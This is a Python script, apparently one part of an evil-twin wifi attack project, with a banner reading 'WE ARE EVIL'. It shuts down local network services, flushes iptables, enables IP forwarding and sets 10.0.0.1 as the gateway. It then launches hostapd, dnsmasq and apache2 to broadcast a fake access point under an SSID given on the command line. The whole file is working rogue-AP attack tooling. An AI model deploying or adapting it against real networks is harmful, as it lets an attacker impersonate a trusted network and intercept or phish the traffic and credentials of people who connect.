import os
import sys
import threading
import time



 
### Console colors
W  = '\033[0m'  # white 
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan


### Reset all the setting before we satrt. 
def reset_setting():
	os.system('service NetworkManager start')
	os.system('service hostapd stop')
	os.system('service dnsmasq stop')
	os.system('service rpcbind stop')
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	os.system('systemctl enable systemd-resolved.service') 
	os.system('systemctl start systemd-resolved')  

	
### Setup the fake access point settings.
def fake_ap_on():
	### Kill all the process that uses port 53.
	os.system('systemctl disable systemd-resolved.service')
	os.system('systemctl stop systemd-resolved')
	### ???
	os.system('service NetworkManager stop')
	### Define the fake AP ip address, and the subnet mask.
	ifconfig="ifconfig "+ interface2 +" 10.0.0.1 netmask 255.255.255.0"
	# os.system('airmon-ng check kill')
	### Replace airmon-ng.
	os.system(' pkill -9 hostapd')
	os.system(' pkill -9 dnsmasq')
	os.system(' pkill -9 wpa_supplicant')
	os.system(' pkill -9 avahi-daemon')
	os.system(' pkill -9 dhclient')
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	os.system(ifconfig)
	### Define the default gateway.
	os.system('route add default gw 10.0.0.1')
	### ????
	os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	### ???
	os.system('iptables --flush')
	os.system('iptables --table nat --flush')
	os.system('iptables --delete-chain')
	os.system('iptables --table nat --delete-chain')
	os.system('iptables -P FORWARD ACCEPT')






### Create the hostapd and dnsmasq configuration files.	
def create_conf_files():
	line="python3 create_conf_files.py "+ interface2 + " " + essid
	os.system(line)



### Link dnsmasq and hostapd to the configuration files. And Run the apache server.
def run_fake_ap():
	os.system('dnsmasq -C dnsmasq.conf')
	os.system('service apache2 start')
	os.system('route add default gw 10.0.0.1')
	os.system('hostapd hostapd.conf -B')
	os.system('service apache2 start')
	os.system('route add default gw 10.0.0.1')



def set_gateway():
	time.sleep(3)
	os.system('gnome-terminal -- sh -c "route add default gw 10.0.0.1"')
	#os.system('route add default gw 10.0.0.1')



### Delete the hostapd and dnsmasq configuration files (they were temp files).
def remove_conf_files():
	try:
	    os.remove("dnsmasq.conf")
	except OSError:
	    pass
	try:
	    os.remove("hostapd.conf")
	except OSError:
	    pass




### Power off the fake AP and reset the network setting (for the computer).
def fake_ap_off():
	os.system('service NetworkManager start')
	os.system('service hostapd stop')
	os.system('service apache2 stop')
	os.system('service dnsmasq stop')
	os.system('service rpcbind stop')
	os.system('killall dnsmasq')
	os.system('killall hostapd')
	os.system('systemctl enable systemd-resolved.service') 
	os.system('systemctl start systemd-resolved')   

######################

if __name__ == "__main__":


	print(B + "********************************************************************** \n")
	print("******** Part 2: Set up & upload fake AP. MOHAHA. WE ARE EVIL ******** \n")
	print("********************************************************************** \n")
	print(G + " Step 1:  Choosing an interface that will be used for the fake AP.\n")
	empty = input ("Press Enter to continue.........\n")
	print(W)

	os.system('ifconfig')
	global interface2
	interface2 = input(G + "Please enter the interface name you want to use: ")
	reset_setting() 
	# ssid=input("Please enter the SSID name \n")
	global essid
	essid = sys.argv[1] 
	
	
	fake_ap_on()
	create_conf_files()
	t1 = threading.Thread(target=run_fake_ap())
	t2 = threading.Thread(set_gateway())
	t1.start()
	t2.start()
	t1.join()
	t2.join()
	check=input("please click enter to close")
	remove_conf_files()
	fake_ap_off()

	
	
